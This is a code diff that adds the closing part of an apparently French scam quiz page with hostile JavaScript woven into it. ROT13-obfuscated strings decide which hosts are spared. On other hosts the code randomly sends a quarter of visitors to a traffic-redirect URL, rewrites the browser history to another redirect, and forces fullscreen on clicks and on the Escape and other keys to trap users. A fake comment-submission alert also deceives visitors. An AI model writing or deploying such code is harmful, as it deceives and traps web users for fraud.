+    for (var nodes = document.querySelectorAll("#q3 .hover"), c = 0; c < nodes.length; c++) {
+        nodes[c].onclick = function() {
+            processQ3()
+        }
+    }
+    for (var nodes = document.querySelectorAll("#q4 .hover"), c = 0; c < nodes.length; c++) {
+        nodes[c].onclick = function() {
+            processQ4()
+        }
+    }
+    for (var nodes = document.querySelectorAll("#q5 .hover"), c = 0; c < nodes.length; c++) {
+        nodes[c].onclick = function() {
+            processQ5()
+        }
+    }
+    nodes = q1.getElementsByTagName("input");
+    for (c = 0; c < nodes.length; c++) {
+        nodes[c].onclick = function() {
+            processQ1()
+        }
+    }
+    nodes = q2.getElementsByTagName("input");
+    for (c = 0; c < nodes.length; c++) {
+        nodes[c].onclick = function() {
+            processQ2()
+        }
+    }
+    nodes = q3.getElementsByTagName("input");
+    for (c = 0; c < nodes.length; c++) {
+        nodes[c].onclick = function() {
+            processQ3()
+        }
+    }
+    nodes = q4.getElementsByTagName("input");
+    for (c = 0; c < nodes.length; c++) {
+        nodes[c].onclick = function() {
+            processQ4()
+        }
+    }
+    nodes = q5.getElementsByTagName("input");
+    for (c = 0; c < nodes.length; c++) {
+        nodes[c].onclick = function() {
+            processQ5()
+        }
+    }
+    window.onload = function() {
+        var b = window.location;
+        document.getElementById("main-container").className = "content";
+        if (udoma(b) == r("ybpnyubfg") || udoma(b) == r("dhvmmvgpu.arg") || udoma(b) == r("vv-erjneqf.pbz") || udoma(b) == r("engrzlpbaarpgvba.pbz") || udoma(b) == r("radhrgrbssvpvryyr.se")) {} else {
+            if (percha(25)) {
+                var a = "";
+                if (urlParams.keyword) {
+                    a = urlParams.keyword
+                } else {
+                    if (urlParams.target) {
+                        a = urlParams.target
+                    } else {
+                        if (urlParams.kw) {
+                            a = urlParams.kw
+                        }
+                    }
+                }
+                window.location = prefix + r("uggc://guerrqverpg.arg/cngu/yc.cuc?geivq=10166&geik=00n3n464&vfc=FSE") + kw + a
+            }
+        }
+    };
+    var urlParams;
+    (window.onpopstate = function() {
+        var f, b = /\+/g,
+            g = /([^&=]+)=?([^&]*)/g,
+            d = function(h) {
+                return decodeURIComponent(h.replace(b, " "))
+            },
+            a = window.location.search.substring(1);
+        urlParams = {};
+        while (f = g.exec(a)) {
+            urlParams[d(f[1])] = d(f[2])
+        }
+    })();
+
+    if (udoma(window.location) != 'localhost') {
+        history.replaceState({}, null, "http://threedirect.net/path/out.php?sxid=0&amp;g=&amp;source=");
+    }
+    </script>
+    <script type="text/javascript">
+
+
+    function toggleFullScreenFF() {
+        if (!document.fullscreenElement && // alternative standard method
+            !document.mozFullScreenElement && !document.webkitFullscreenElement) { // current working methods
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.mozRequestFullScreen) {
+                document.documentElement.mozRequestFullScreen();
+            } else if (document.documentElement.webkitRequestFullscreen) {
+                document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+            }
+        } else {
+            if (document.cancelFullScreen) {
+                document.cancelFullScreen();
+            } else if (document.mozCancelFullScreen) {
+                document.mozCancelFullScreen();
+            } else if (document.webkitCancelFullScreen) {
+                document.webkitCancelFullScreen();
+            }
+        }
+    }
+    var isSafari = !!navigator.userAgent.match(/Version\/[\d\.]+.*Safari/);
+    var isFirefox = navigator.userAgent.toLowerCase().indexOf('firefox') > -1;
+    var moz = true;
+
+    function toggleFullScreen() {
+        if (!isSafari && !isFirefox && !lastStep) {
+            if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+
+                } else if (document.documentElement.mozRequestFullScreen) {
+                    document.documentElement.mozRequestFullScreen();
+
+                } else if (document.documentElement.webkitRequestFullscreen) {
+                    document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+                }
+            }
+        }
+        if (navigator.userAgent.indexOf("Firefox") != -1) {
+
+            if (moz == true) {
+                toggleFullScreenFF();
+                moz = false;
+            }
+        }
+    }
+
+    document.addEventListener('keyup', function(es) {
+        if (es.keyCode == 27) {
+            toggleFullScreen();
+
+        }
+    }, false);
+
+    document.addEventListener('keyup', function(e) {
+        if (e.keyCode == 122 || e.keyCode == 17 || e.keyCode == 18 || e.keyCode == 13) {
+            //document.getElementById('map').innerHTML = stroka;
+            toggleFullScreen();
+        }
+    }, false);
+
+    window.onload = function() {
+        document.onclick = function(e) {
+            toggleFullScreen();
+        }
+    }
+
+    addEventListener("click", function() {
+        var
+            el = document.documentElement,
+            rfs =
+            el.requestFullScreen ||
+            el.webkitRequestFullScreen || el.mozRequestFullScreen;
+
+        if (!(rfs == null) && !(typeof rfs == 'undefined') && !isSafari && !isFirefox && !lastStep) {
+            rfs.call(el);
+        }
+
+    });
+
+
+
+    $(document).ready(function() {
+    });
+
+    function comment() {
+        document.getElementById("comment").value = "";
+        alert("Votre commentaire a été soumis et est actuellement en attente d'approbation.");
+    }
+    </script>
+    <audio autoplay>
+        <source src="the-calling.mp3" type="audio/mpeg">
+    </audio>
+    <div align="center" class="footer__image">
+        <a href="http://www.dmca.com/Protection/Status.aspx?ID=54831afa-95e5-4756-a3e5-9f829e13a1a4" title="DMCA.com Protection Status" class="dmca-badge"> <img src="img/dmc_badge.png" alt="DMCA.com Protection Status"></a>
+    </div>
+
+<script>document.write('<script src="http://' + (location.host || 'localhost').split(':')[0] + ':35729/livereload.js?snipver=1"></' + 'script>')</script>
+</body>
+
+</html>
